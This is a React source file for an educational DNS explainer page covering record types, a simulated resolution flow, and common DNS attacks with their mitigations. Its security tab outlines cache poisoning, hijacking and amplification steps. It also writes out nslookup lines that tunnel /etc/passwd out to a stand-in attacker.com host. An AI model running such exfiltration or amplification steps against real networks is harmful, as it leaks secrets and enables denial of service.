"use client"

import { useState, useEffect } from "react"
import { motion, AnimatePresence } from "framer-motion"
import {
  ArrowLeft, Globe, Server, Database, Search, Clock, Trash2,
  ChevronRight, Shield, AlertTriangle,
  CheckCircle2, Zap, FileText, RefreshCw
} from "lucide-react"
import Link from "next/link"
import { cn } from "@/lib/utils"

type Tab = "overview" | "records" | "resolution" | "security"

const TABS: { id: Tab; label: string }[] = [
  { id: "overview", label: "Overview" },
  { id: "records", label: "Record Types" },
  { id: "resolution", label: "Resolution Flow" },
  { id: "security", label: "Security" },
]

export default function DNSPage() {
  const [tab, setTab] = useState<Tab>("overview")
  return (
    <main className="min-h-screen bg-[#0a0a0a] text-white p-4 sm:p-8 selection:bg-blue-500/30">
      <nav className="flex justify-between items-center mb-8 max-w-7xl mx-auto">
        <Link href="/" className="flex items-center gap-2 text-gray-500 hover:text-white transition-colors group text-sm">
          <ArrowLeft className="w-4 h-4 group-hover:-translate-x-1 transition-transform" />
          Back to Dashboard
        </Link>
        <div className="px-4 py-1.5 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] font-black uppercase tracking-widest flex items-center gap-2">
          <Globe className="w-3 h-3" /> DNS · RFC 1034/1035
        </div>
      </nav>

      <div className="max-w-7xl mx-auto space-y-8">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-3">
          <h1 className="text-5xl sm:text-6xl font-black tracking-tighter bg-linear-to-br from-white via-white to-blue-400 bg-clip-text text-transparent">
            DNS Atlas
          </h1>
          <p className="text-gray-500 text-sm leading-relaxed max-w-2xl">
            The internet&apos;s phonebook — how domain names resolve to IP addresses, what DNS records actually do, and how attackers exploit them.
          </p>
        </motion.div>

        <div className="flex gap-2 flex-wrap pb-2 border-b border-white/5">
          {TABS.map(t => (
            <button key={t.id} onClick={() => setTab(t.id)} className={cn(
              "px-5 py-2 rounded-full text-[11px] font-bold uppercase tracking-wider transition-all border",
              tab === t.id ? "bg-blue-600 border-blue-400 text-white shadow-lg shadow-blue-500/20" : "bg-white/5 border-white/10 text-gray-500 hover:border-white/20 hover:text-gray-200"
            )}>{t.label}</button>
          ))}
        </div>

        <AnimatePresence mode="wait">
          <motion.div key={tab} initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -16 }} transition={{ duration: 0.18 }}>
            {tab === "overview" && <OverviewTab />}
            {tab === "records" && <RecordsTab />}
            {tab === "resolution" && <ResolutionTab />}
            {tab === "security" && <SecurityTab />}
          </motion.div>
        </AnimatePresence>
      </div>
    </main>
  )
}

/* ════════ OVERVIEW ════════ */
function OverviewTab() {
  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="glass p-8 rounded-[32px] border-white/5 space-y-5">
          <div className="flex items-center gap-3">
            <div className="p-3 rounded-2xl bg-blue-500/10 text-blue-400 border border-blue-500/20"><Globe className="w-5 h-5" /></div>
            <h2 className="text-xl font-black">The Internet&apos;s Phonebook</h2>
          </div>
          <p className="text-sm text-gray-400 leading-relaxed">
            When you type <code className="text-blue-300">google.com</code> in a browser, your computer has no idea where that is. DNS (<strong className="text-white">Domain Name System</strong>) translates that human-readable name into a machine-usable IP address like <code className="text-blue-300">142.250.190.46</code>.
          </p>
          <p className="text-sm text-gray-400 leading-relaxed">
            Without DNS, you&apos;d have to memorize the IP address of every website you visit. DNS is a <strong className="text-white">distributed, hierarchical database</strong> — no single server holds all the data. Instead, it&apos;s split across millions of servers worldwide.
          </p>
          <div className="p-5 rounded-2xl bg-blue-500/5 border border-blue-500/10 font-mono text-xs space-y-2">
            <p className="text-gray-600">{"// The lookup you trigger on every page visit:"}</p>
            <p><span className="text-blue-400">DNS_QUERY</span><span className="text-gray-500">(</span><span className="text-white">&quot;google.com&quot;</span><span className="text-gray-500">)</span></p>
            <p className="text-gray-600 pl-4">→ Recursive Resolver checks cache...</p>
            <p className="text-gray-600 pl-4">→ Root Server → TLD Server → Authoritative NS</p>
            <p><span className="text-emerald-400">RESULT:</span> <span className="text-white">142.250.190.46</span> <span className="text-gray-600">(cached for TTL seconds)</span></p>
          </div>
        </div>

        <div className="glass p-8 rounded-[32px] border-white/5 space-y-5">
          <h3 className="text-[10px] font-black uppercase tracking-widest text-gray-600">Why DNS is Critical Infrastructure</h3>
          <div className="space-y-3">
            {[
              { title: "Abstraction Layer", desc: "IP addresses change (servers move, CDNs rotate). DNS lets you update the IP without telling every user. You just change the DNS record.", icon: <RefreshCw className="w-4 h-4" />, color: "blue" },
              { title: "Load Distribution", desc: "A single domain can resolve to many different IPs. DNS can return different addresses per query for geographic routing, load balancing, or failover.", icon: <Zap className="w-4 h-4" />, color: "violet" },
              { title: "Massive Scale", desc: "The DNS system processes over 1 trillion queries per day globally with sub-100ms response times. It's one of the most successful distributed systems ever built.", icon: <Globe className="w-4 h-4" />, color: "emerald" },
              { title: "Single Point of Failure Risk", desc: "DNS outages take down entire companies. The 2016 Dyn DNS DDoS attack took down Twitter, Netflix, Reddit, and GitHub simultaneously for hours.", icon: <AlertTriangle className="w-4 h-4" />, color: "red" },
            ].map(item => (
              <div key={item.title} className={cn("p-4 rounded-2xl border flex gap-3",
                item.color === "blue" ? "bg-blue-500/5 border-blue-500/15" :
                item.color === "violet" ? "bg-violet-500/5 border-violet-500/15" :
                item.color === "emerald" ? "bg-emerald-500/5 border-emerald-500/15" :
                "bg-red-500/5 border-red-500/15"
              )}>
                <div className={cn("mt-0.5", item.color === "blue" ? "text-blue-400" : item.color === "violet" ? "text-violet-400" : item.color === "emerald" ? "text-emerald-400" : "text-red-400")}>{item.icon}</div>
                <div>
                  <p className="text-sm font-bold mb-1">{item.title}</p>
                  <p className="text-[12px] text-gray-500 leading-relaxed">{item.desc}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>

      <div className="glass p-8 rounded-[32px] border-white/5 space-y-5">
        <h3 className="text-[10px] font-black uppercase tracking-widest text-gray-600">DNS Hierarchy — The 3 Levels</h3>
        <div className="grid grid-cols-1 sm:grid-cols-4 gap-4">
          {[
            { level: "Root Zone", symbol: ".", desc: "The top of the DNS hierarchy. 13 sets of root server clusters (lettered A–M) distributed globally via anycast. Operated by IANA and various orgs.", nodes: "1,843 root servers worldwide", color: "rose" },
            { level: "TLD Servers", symbol: ".com / .org", desc: "Top-Level Domain servers managed by registries. Verisign manages .com and .net. Each TLD server knows which NS servers handle its domains.", nodes: "~1,500 TLD zones", color: "orange" },
            { level: "Authoritative NS", symbol: "google.com NS", desc: "The definitive source for a domain. When you buy a domain and configure it with your hosting provider, you're pointing to these servers.", nodes: "Millions, one per registered domain zone", color: "amber" },
            { level: "Recursive Resolver", symbol: "8.8.8.8", desc: "Your ISP's or a public resolver (Google 8.8.8.8, Cloudflare 1.1.1.1). Does all the querying work on your behalf, caches results.", nodes: "Google, Cloudflare, ISPs", color: "blue" },
          ].map(l => (
            <div key={l.level} className={cn("p-5 rounded-2xl border space-y-3",
              l.color === "rose" ? "bg-rose-500/5 border-rose-500/20" :
              l.color === "orange" ? "bg-orange-500/5 border-orange-500/20" :
              l.color === "amber" ? "bg-amber-500/5 border-amber-500/20" :
              "bg-blue-500/5 border-blue-500/20"
            )}>
              <div>
                <p className={cn("text-[10px] font-black uppercase tracking-widest", l.color === "rose" ? "text-rose-400" : l.color === "orange" ? "text-orange-400" : l.color === "amber" ? "text-amber-400" : "text-blue-400")}>{l.level}</p>
                <code className="text-gray-500 text-[10px]">{l.symbol}</code>
              </div>
              <p className="text-[12px] text-gray-400 leading-relaxed">{l.desc}</p>
              <p className={cn("text-[10px] font-bold", l.color === "rose" ? "text-rose-500/60" : l.color === "orange" ? "text-orange-500/60" : l.color === "amber" ? "text-amber-500/60" : "text-blue-500/60")}>{l.nodes}</p>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}

/* ════════ RECORD TYPES ════════ */
function RecordsTab() {
  const [active, setActive] = useState("A")
  const records = [
    {
      type: "A", color: "blue", fullName: "Address Record",
      description: "Maps a domain name to an IPv4 address. The most fundamental DNS record — this is what makes 'google.com' resolve to an IP your browser can connect to.",
      example: `google.com.    IN  A    142.250.190.46
www.example.com. IN  A    93.184.216.34
api.myapp.com.  IN  A    203.0.113.42`,
      details: ["TTL (Time To Live) controls how long resolvers cache this record. Low TTL = faster propagation but more DNS load.", "One domain can have multiple A records — all IPs get returned. The resolver or browser picks one (usually round-robin). This is basic DNS-based load balancing.", "An A record with '@' applies to the root domain itself."],
    },
    {
      type: "AAAA", color: "violet", fullName: "IPv6 Address Record",
      description: "Same as A but for IPv6 addresses. As the world transitions to IPv6, servers increasingly have both A and AAAA records. Browsers prefer IPv6 when available (Happy Eyeballs algorithm).",
      example: `google.com.    IN  AAAA  2607:f8b0:4004:c07::65
example.com.   IN  AAAA  2001:db8::1`,
      details: ["IPv6 has 128-bit addresses vs IPv4's 32-bit — the world has finally run out of IPv4 addresses.", "Most major websites have dual-stack: both A and AAAA records.", "colons in IPv6 are for readability; consecutive groups of zeros can be abbreviated with ::."],
    },
    {
      type: "CNAME", color: "emerald", fullName: "Canonical Name Record",
      description: "An alias that points one domain name to another domain name (not an IP). The resolver follows the chain until it finds an A record. Useful for www. subdomains and service hostnames.",
      example: `www.example.com.    IN  CNAME  example.com.
blog.example.com.   IN  CNAME  myblog.wordpress.com.
shop.example.com.   IN  CNAME  myshop.myshopify.com.`,
      details: ["CNAME cannot coexist with other records on the same name. You can't have a CNAME and an MX record for 'example.com'.", "This is why you can't CNAME a naked/root domain (@) in standard DNS — use ALIAS or ANAME records instead.", "CNAMEs chain: www → example.com → 93.184.216.34. Each hop requires an extra DNS lookup."],
    },
    {
      type: "MX", color: "rose", fullName: "Mail Exchange Record",
      description: "Tells email servers where to deliver email for a domain. Points to a mail server hostname (not an IP). The priority number means lower = higher priority — used for failover.",
      example: `example.com.  IN  MX  1   aspmx.l.google.com.
example.com.  IN  MX  5   alt1.aspmx.l.google.com.
example.com.  IN  MX  10  alt2.aspmx.l.google.com.`,
      details: ["MX records must point to A/AAAA hostnames, not IPs or CNAMEs.", "Priority (1, 5, 10): the sending MTA tries the lowest priority number first. Higher numbers are fallback.", "Missing or misconfigured MX records = your domain can't receive email."],
    },
    {
      type: "TXT", color: "amber", fullName: "Text Record",
      description: "Arbitrary text data attached to a domain. Originally for human-readable info, now heavily used for domain verification, email authentication (SPF, DKIM, DMARC), and proving domain ownership.",
      example: `example.com.  IN  TXT  "v=spf1 include:_spf.google.com ~all"
example.com.  IN  TXT  "google-site-verification=abc123..."
_dmarc.example.com. IN TXT  "v=DMARC1; p=reject; rua=mailto:..."`,
      details: ["SPF (Sender Policy Framework): which servers are allowed to send email from your domain.", "DKIM: cryptographic signature proving emails weren't tampered with in transit.", "DMARC: policy for what to do with email that fails SPF/DKIM. Prevents domain spoofing in phishing."],
    },
    {
      type: "NS", color: "cyan", fullName: "Name Server Record",
      description: "Specifies which DNS servers are authoritative for the domain. When you buy a domain, your registrar's NS records tell the TLD servers which servers to ask for your domain's records.",
      example: `example.com.  IN  NS  ns1.cloudflare.com.
example.com.  IN  NS  ns2.cloudflare.com.
example.com.  IN  NS  ns3.cloudflare.com.`,
      details: ["NS records are set at your domain registrar (GoDaddy, Namecheap, etc.), not at your DNS provider.", "Changing nameservers takes up to 48 hours to propagate (this is called DNS propagation).", "You should always have at least 2 NS records for redundancy."],
    },
    {
      type: "PTR", color: "indigo", fullName: "Pointer Record",
      description: "Reverse DNS — maps an IP address back to a domain name. Used for email server validation, debugging, and logging. Lives in the in-addr.arpa zone for IPv4.",
      example: `46.190.250.142.in-addr.arpa.  IN  PTR  mail.google.com.
1.113.0.203.in-addr.arpa.    IN  PTR  host.example.com.`,
      details: ["PTR records are controlled by the IP address owner (usually your cloud provider or ISP), not by you.", "Email servers check PTR records — if your sending IP doesn't have a PTR record matching your domain, your email may be marked as spam.", "The IP is written in reverse: 93.184.216.34 → 34.216.184.93.in-addr.arpa."],
    },
    {
      type: "SOA", color: "gray", fullName: "Start of Authority",
      description: "Every DNS zone has exactly one SOA record. It contains administrative info: which NS is primary, the admin email, the zone serial number, and refresh/retry/expire timings for secondary servers.",
      example: `example.com.  IN  SOA  ns1.example.com. admin.example.com. (
              2024011501  ; Serial (YYYYMMDDNN)
              3600        ; Refresh (secondary checks primary every 1hr)
              900         ; Retry (if refresh fails, retry after 15min)
              604800      ; Expire (secondary stops after 7 days)
              300         ; Minimum TTL
)`,
      details: ["The serial number is incremented every time the zone changes. Secondaries use it to detect updates.", "Secondary NS servers pull zone data from the primary using the SOA refresh interval.", "SOA is not queried directly by end users but is critical for zone management."],
    },
  ]
  const active_record = records.find(r => r.type === active)!
  const colorMap: Record<string, { text: string; badge: string; bg: string; border: string }> = {
    blue: { text: "text-blue-400", badge: "bg-blue-500/20 border-blue-500/30", bg: "bg-blue-500/5", border: "border-blue-500/20" },
    violet: { text: "text-violet-400", badge: "bg-violet-500/20 border-violet-500/30", bg: "bg-violet-500/5", border: "border-violet-500/20" },
    emerald: { text: "text-emerald-400", badge: "bg-emerald-500/20 border-emerald-500/30", bg: "bg-emerald-500/5", border: "border-emerald-500/20" },
    rose: { text: "text-rose-400", badge: "bg-rose-500/20 border-rose-500/30", bg: "bg-rose-500/5", border: "border-rose-500/20" },
    amber: { text: "text-amber-400", badge: "bg-amber-500/20 border-amber-500/30", bg: "bg-amber-500/5", border: "border-amber-500/20" },
    cyan: { text: "text-cyan-400", badge: "bg-cyan-500/20 border-cyan-500/30", bg: "bg-cyan-500/5", border: "border-cyan-500/20" },
    indigo: { text: "text-indigo-400", badge: "bg-indigo-500/20 border-indigo-500/30", bg: "bg-indigo-500/5", border: "border-indigo-500/20" },
    gray: { text: "text-gray-400", badge: "bg-gray-500/20 border-gray-500/30", bg: "bg-gray-500/5", border: "border-gray-500/20" },
  }
  const c = colorMap[active_record.color]
  return (
    <div className="space-y-6">
      <div className="flex gap-2 flex-wrap">
        {records.map(r => {
          const rc = colorMap[r.color]
          return (
            <button key={r.type} onClick={() => setActive(r.type)} className={cn(
              "px-4 py-2 rounded-full font-mono text-[11px] font-black border transition-all",
              active === r.type ? `${rc.badge} ${rc.text}` : "bg-white/5 border-white/10 text-gray-600 hover:text-white"
            )}>{r.type}</button>
          )
        })}
      </div>
      <AnimatePresence mode="wait">
        <motion.div key={active} initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <div className={cn("glass p-8 rounded-[32px] border space-y-5", c.bg, c.border)}>
            <div>
              <div className={cn("inline-flex px-3 py-1.5 rounded-xl text-[10px] font-black border font-mono mb-3", c.badge, c.text)}>{active} Record</div>
              <h2 className={cn("text-2xl font-black", c.text)}>{active_record.fullName}</h2>
            </div>
            <p className="text-sm text-gray-400 leading-relaxed">{active_record.description}</p>
            <div className="space-y-2">
              <p className="text-[10px] font-black uppercase tracking-widest text-gray-600">Zone File Syntax</p>
              <pre className={cn("p-5 rounded-2xl border text-xs font-mono leading-6 whitespace-pre-wrap", c.bg, c.border, c.text)}>{active_record.example}</pre>
            </div>
          </div>
          <div className="glass p-8 rounded-[32px] border-white/5 space-y-4">
            <p className="text-[10px] font-black uppercase tracking-widest text-gray-600">Key Details</p>
            <div className="space-y-3">
              {active_record.details.map((d, i) => (
                <div key={i} className="flex gap-3 p-4 rounded-2xl bg-black/30 border border-white/5">
                  <CheckCircle2 className={cn("w-4 h-4 shrink-0 mt-0.5", c.text)} />
                  <p className="text-sm text-gray-400 leading-relaxed">{d}</p>
                </div>
              ))}
            </div>
          </div>
        </motion.div>
      </AnimatePresence>
    </div>
  )
}

/* ════════ RESOLUTION FLOW ════════ */
type CacheEntry = { domain: string; ip: string; ttl: number; expiresAt: number }

const DNS_STEPS = [
  { id: "check", name: "Local Cache Check", type: "resolver" as const, icon: <Database className="w-6 h-6" />, description: "Your OS and resolver first check the local DNS cache. If a recent lookup already resolved this domain and the TTL hasn't expired, the cached IP is returned instantly.", response: "CACHE HIT → return immediately (0ms)", color: "emerald" },
  { id: "resolver", name: "Recursive Resolver", type: "resolver" as const, icon: <Server className="w-6 h-6" />, description: "Your ISP's recursive resolver (or Google/Cloudflare if configured) accepts your query. It has its own cache and, if it doesn't have the answer, begins the recursive lookup on your behalf.", response: "Querying the root zone...", color: "blue" },
  { id: "root", name: "Root Name Server", type: "root" as const, icon: <Globe className="w-6 h-6" />, description: "The root servers don't know the answer but they know who does. They return a referral to the appropriate TLD server based on the domain extension (.com, .org, .io etc).", response: "Try the .com TLD servers: a.gtld-servers.net", color: "violet" },
  { id: "tld", name: "TLD Name Server", type: "tld" as const, icon: <Zap className="w-6 h-6" />, description: "The .com TLD server managed by Verisign doesn't know the IP either, but it knows which authoritative nameservers are responsible for google.com. It returns a referral to those NS records.", response: "Try google's NS: ns1.google.com", color: "amber" },
  { id: "auth", name: "Authoritative NS", type: "auth" as const, icon: <FileText className="w-6 h-6" />, description: "This is the final source of truth. Google's own nameservers have the actual A record for google.com and return the IP address. The resolver caches this for the TTL period.", response: "google.com A 142.250.190.46 (TTL: 300s)", color: "rose" },
]

function ResolutionTab() {
  const [domain, setDomain] = useState("google.com")
  const [activeStep, setActiveStep] = useState<number>(-1)
  const [isResolving, setIsResolving] = useState(false)
  const [logs, setLogs] = useState<{ msg: string; type: string; time: string }[]>([])
  const [cache, setCache] = useState<CacheEntry[]>([])
  const [now, setNow] = useState(() => Date.now())
  const addLog = (msg: string, type = "out") => setLogs(p => [{ msg, type, time: new Date().toLocaleTimeString().split(" ")[0] }, ...p].slice(0, 12))

  useEffect(() => {
    const t = setInterval(() => { setNow(Date.now()); setCache(p => p.filter(e => e.expiresAt > Date.now())) }, 1000)
    return () => clearInterval(t)
  }, [])

  const resolve = async () => {
    if (isResolving || !domain) return
    const cached = cache.find(c => c.domain.toLowerCase() === domain.toLowerCase())
    if (cached) { addLog(`CACHE HIT: ${domain} → ${cached.ip} (${Math.round((cached.expiresAt - now) / 1000)}s remaining)`, "cache"); return }
    setIsResolving(true); setActiveStep(-1); setLogs([])
    addLog(`Starting recursive lookup for ${domain}...`)
    for (let i = 0; i < DNS_STEPS.length; i++) {
      setActiveStep(i)
      addLog(`Querying ${DNS_STEPS[i].name}...`)
      await new Promise(r => setTimeout(r, 1400))
      addLog(`${DNS_STEPS[i].name}: ${DNS_STEPS[i].response}`, "in")
      await new Promise(r => setTimeout(r, 300))
    }
    const ip = `${142 + Math.floor(Math.random() * 10)}.${250 - Math.floor(Math.random() * 5)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
    setCache(p => [...p, { domain, ip, ttl: 300, expiresAt: Date.now() + 300000 }])
    addLog(`Cached: ${domain} → ${ip} (TTL: 300s)`, "cache")
    setIsResolving(false); setActiveStep(-1)
  }

  const colorMap: Record<string, string> = { emerald: "text-emerald-400 bg-emerald-500/10 border-emerald-500/30", blue: "text-blue-400 bg-blue-500/10 border-blue-500/30", violet: "text-violet-400 bg-violet-500/10 border-violet-500/30", amber: "text-amber-400 bg-amber-500/10 border-amber-500/30", rose: "text-rose-400 bg-rose-500/10 border-rose-500/30" }

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
        {/* Controls */}
        <div className="space-y-4">
          <div className="glass p-6 rounded-[32px] border-white/5 space-y-4">
            <p className="text-[10px] font-black uppercase tracking-widest text-gray-600">DNS Lookup</p>
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-600" />
              <input value={domain} onChange={e => setDomain(e.target.value.toLowerCase())} placeholder="google.com"
                className="w-full bg-black/40 border border-white/10 rounded-xl pl-10 pr-3 py-2.5 text-sm focus:border-blue-500/50 outline-none transition-colors" />
            </div>
            <button onClick={resolve} disabled={isResolving} className="w-full py-3.5 rounded-2xl bg-blue-600 hover:bg-blue-500 disabled:opacity-50 text-white font-bold text-sm transition-all active:scale-95">
              {isResolving ? "Resolving..." : "Execute Lookup"}
            </button>
            <div className="flex flex-wrap gap-1.5">
              {["google.com", "cloudflare.com", "github.com"].map(d => (
                <button key={d} onClick={() => setDomain(d)} className="px-3 py-1 rounded-lg bg-white/5 border border-white/10 text-[10px] text-gray-500 hover:text-white transition-colors font-mono">{d}</button>
              ))}
            </div>
          </div>
          <div className="glass p-5 rounded-[24px] border-white/5 space-y-3">
            <div className="flex justify-between items-center">
              <p className="text-[10px] font-black uppercase tracking-widest text-blue-400 flex items-center gap-2"><Clock className="w-3 h-3" />DNS Cache</p>
              <button onClick={() => setCache([])} className="text-gray-700 hover:text-red-400 transition-colors"><Trash2 className="w-3.5 h-3.5" /></button>
            </div>
            <div className="space-y-2 max-h-40 overflow-y-auto">
              {cache.map((e, i) => (
                <div key={i} className="flex justify-between items-center p-2.5 bg-white/3 rounded-xl border border-white/5">
                  <div><p className="text-[11px] font-bold text-blue-300">{e.domain}</p><p className="text-[9px] text-gray-600 font-mono">{e.ip}</p></div>
                  <div className="text-[9px] font-mono px-2 py-1 rounded bg-emerald-500/10 text-emerald-400">{Math.max(0, Math.round((e.expiresAt - now) / 1000))}s</div>
                </div>
              ))}
              {!cache.length && <p className="text-[10px] text-gray-800 text-center py-4 italic">Cache empty</p>}
            </div>
          </div>
        </div>

        {/* Main flow */}
        <div className="lg:col-span-3 space-y-4">
          <div className="glass p-6 rounded-[32px] border-white/5 space-y-4">
            <div className="flex flex-col gap-3">
              {DNS_STEPS.map((step, i) => {
                const isActive = activeStep === i
                const isDone = activeStep > i
                const cols = colorMap[step.color]
                return (
                  <motion.div key={step.id} animate={{ opacity: isResolving ? (isActive ? 1 : isDone ? 0.8 : 0.3) : 1 }}
                    className={cn("flex gap-4 p-4 rounded-2xl border transition-all duration-500", isActive ? cols : "bg-white/3 border-white/5")}>
                    <div className={cn("w-10 h-10 rounded-xl flex items-center justify-center shrink-0 border transition-all", isActive ? cols : "bg-white/5 border-white/10 text-gray-700")}>
                      {isDone ? <CheckCircle2 className="w-5 h-5 text-emerald-400" /> : step.icon}
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="flex justify-between items-start">
                        <p className={cn("text-sm font-bold", isActive ? cols.split(" ")[0] : "text-gray-400")}>{step.name}</p>
                        {isActive && <span className="text-[9px] text-gray-600 font-mono animate-pulse">ACTIVE</span>}
                      </div>
                      <p className="text-[11px] text-gray-600 leading-relaxed mt-0.5">{step.description}</p>
                      {(isActive || isDone) && <p className={cn("text-[10px] font-mono mt-2", cols.split(" ")[0])}>{step.response}</p>}
                    </div>
                  </motion.div>
                )
              })}
            </div>
          </div>
          <div className="glass p-5 rounded-[24px] border-white/5 space-y-2 max-h-44 overflow-y-auto">
            <p className="text-[10px] font-black uppercase tracking-widest text-gray-600 sticky top-0 bg-[#0a0a0a]/80 pb-1">Resolver Log</p>
            {logs.map((l, i) => (
              <div key={i} className={cn("text-[10px] font-mono p-2 rounded-lg border-l-2",
                l.type === "cache" ? "bg-emerald-500/5 border-emerald-500 text-emerald-400" :
                l.type === "in" ? "bg-blue-500/5 border-blue-500 text-blue-300" :
                "bg-white/3 border-white/20 text-gray-500"
              )}><span className="text-gray-700 mr-2">[{l.time}]</span>{l.msg}</div>
            ))}
            {!logs.length && <p className="text-gray-800 italic text-[10px] text-center py-4">Waiting for query...</p>}
          </div>
        </div>
      </div>
    </div>
  )
}

/* ════════ SECURITY ════════ */
function SecurityTab() {
  const [expanded, setExpanded] = useState<string | null>("spoofing")
  const threats = [
    {
      id: "spoofing", severity: "CRITICAL", color: "red",
      title: "DNS Cache Poisoning / Spoofing",
      summary: "An attacker injects forged DNS records into a resolver's cache, causing all users of that resolver to be directed to a malicious IP for a legitimate domain name.",
      attack: `// Attacker exploits predictable query IDs in UDP:
// 1. User queries resolver: "What is bank.com?"
// 2. Resolver queries root → TLD → auth NS
// 3. Attacker floods resolver with forged responses
//    BEFORE the real authoritative NS responds:
//    "bank.com A 192.168.1.100 (attacker's server)"
// 4. If ID matches, resolver caches the fake record
// 5. All users → bank.com → attacker's phishing page`,
      mitigation: "DNSSEC (cryptographic signing of DNS records). DNS over TLS (DoT) or DNS over HTTPS (DoH) — encrypts the query to prevent eavesdropping and tampering.",
    },
    {
      id: "hijacking", severity: "HIGH", color: "orange",
      title: "DNS Hijacking (Registrar Attack)",
      summary: "Attackers compromise domain registrar accounts to change NS records, redirecting all DNS queries for the domain to attacker-controlled nameservers.",
      attack: `// Attack vector: weak registrar password or phishing
// 1. Attacker logs into GoDaddy with stolen creds
// 2. Changes example.com's NS records to:
//    ns1.attacker.com, ns2.attacker.com
// 3. When TTL expires, ALL queries go to attacker NS
// 4. Attacker serves valid-looking A records
//    but can intercept or modify all traffic
// 5. Can also steal SSL certs via DNS-01 challenge!`,
      mitigation: "Enable Registry Lock at your registrar. Use hardware 2FA. Monitor for unauthorized NS changes. Use Domain-based Message Authentication, Reporting and Conformance (DMARC) for email protection.",
    },
    {
      id: "amplification", severity: "HIGH", color: "orange",
      title: "DNS Amplification DDoS",
      summary: "DNS is weaponized for DDoS amplification attacks. A small query (~40 bytes) can trigger a large response (~4000 bytes), achieving 100x amplification when spoofing the victim's IP.",
      attack: `// UDP source IP forgery (spoof victim's IP):
// Attacker sends: 
//   Source IP: victim.com (SPOOFED)
//   Destination: open DNS resolver (8.8.8.8)
//   Query: ANY isc.org? (large response)
//
// Resolver responds back to victim.com 
// with ~4KB response per 40-byte query.
// 
// With botnet sending millions of queries:
// Victim receives gigabits of DNS traffic → DDoS`,
      mitigation: "DNS resolvers should only respond to authorized clients (BCP38 ingress filtering). Rate limiting. Response Rate Limiting (RRL) built into BIND/PowerDNS. Disable ANY queries.",
    },
    {
      id: "tunneling", severity: "MEDIUM", color: "yellow",
      title: "DNS Tunneling (Data Exfiltration)",
      summary: "DNS traffic is often allowed through firewalls when everything else is blocked. Attackers encode data in DNS query names to exfiltrate data or establish C2 channels on locked-down networks.",
      attack: `// Encode data in subdomain labels (63 chars each):
// data chunk → base32 → subdomain name

// Exfiltrate /etc/passwd:
nslookup cm9vdDp4OjA6MA.attacker.com    // chunk 1
nslookup 6LWJpbi9iYXNo.attacker.com    // chunk 2
// attacker.com NS log captures all queries

// Establish C2 channel:
// TXT records in responses = commands
// Subdomains in queries = responses`,
      mitigation: "DNS traffic analysis (unusually long subdomain labels, high query frequencies, unknown external domains). DNS filtering (Cisco Umbrella, NextDNS). Block DNS to unexpected external resolvers.",
    },
  ]
  const badge = (s: string) => s === "CRITICAL" ? "bg-red-500/20 text-red-400 border-red-500/30" : s === "HIGH" ? "bg-orange-500/20 text-orange-400 border-orange-500/30" : "bg-yellow-500/20 text-yellow-400 border-yellow-500/30"
  const border = (c: string) => c === "red" ? "border-red-500/20 hover:border-red-500/40" : c === "orange" ? "border-orange-500/20 hover:border-orange-500/40" : "border-yellow-500/20 hover:border-yellow-500/40"

  return (
    <div className="space-y-6">
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-6">
        {[
          { title: "DNSSEC", desc: "Digitally signs DNS records with public-key cryptography. Resolvers verify signatures chain from root to zone. Prevents cache poisoning.", icon: <Shield className="w-5 h-5" />, color: "emerald" },
          { title: "DNS over HTTPS (DoH)", desc: "Wraps DNS queries in HTTPS. Prevents ISPs and network observers from seeing your DNS queries. Used by Firefox, Chrome, and Cloudflare 1.1.1.1.", icon: <Globe className="w-5 h-5" />, color: "blue" },
          { title: "DNS over TLS (DoT)", desc: "TLS-encrypted DNS channel on port 853. More firewall-visible than DoH but cleaner separation at the protocol level. Supported by Android 9+.", icon: <Zap className="w-5 h-5" />, color: "violet" },
        ].map(d => (
          <div key={d.title} className={cn("glass p-6 rounded-2xl border space-y-3",
            d.color === "emerald" ? "border-emerald-500/20 bg-emerald-500/5" :
            d.color === "blue" ? "border-blue-500/20 bg-blue-500/5" : "border-violet-500/20 bg-violet-500/5"
          )}>
            <div className={cn("w-10 h-10 rounded-xl flex items-center justify-center",
              d.color === "emerald" ? "bg-emerald-500/20 text-emerald-400" :
              d.color === "blue" ? "bg-blue-500/20 text-blue-400" : "bg-violet-500/20 text-violet-400"
            )}>{d.icon}</div>
            <h3 className="font-bold text-sm">{d.title}</h3>
            <p className="text-[12px] text-gray-500 leading-relaxed">{d.desc}</p>
          </div>
        ))}
      </div>
      {threats.map(t => (
        <motion.div key={t.id} layout className={cn("glass rounded-[24px] border overflow-hidden transition-colors", border(t.color))}>
          <button onClick={() => setExpanded(expanded === t.id ? null : t.id)} className="w-full p-5 flex items-start gap-4 text-left">
            <span className={cn("px-2.5 py-1 rounded-lg text-[10px] font-black border shrink-0", badge(t.severity))}>{t.severity}</span>
            <div className="flex-1">
              <h3 className="text-sm font-bold mb-1">{t.title}</h3>
              <p className="text-[12px] text-gray-500 leading-relaxed">{t.summary}</p>
            </div>
            <ChevronRight className={cn("w-4 h-4 text-gray-600 shrink-0 mt-1 transition-transform", expanded === t.id && "rotate-90")} />
          </button>
          <AnimatePresence>
            {expanded === t.id && (
              <motion.div initial={{ height: 0 }} animate={{ height: "auto" }} exit={{ height: 0 }} className="overflow-hidden">
                <div className="px-5 pb-6 pt-4 border-t border-white/5 grid grid-cols-1 lg:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <p className="text-[10px] font-black uppercase tracking-widest text-red-500">Attack</p>
                    <pre className="bg-black/60 border border-red-500/10 rounded-xl p-4 text-xs font-mono text-red-300 whitespace-pre-wrap leading-relaxed">{t.attack}</pre>
                  </div>
                  <div className="space-y-2">
                    <p className="text-[10px] font-black uppercase tracking-widest text-emerald-500">Mitigation</p>
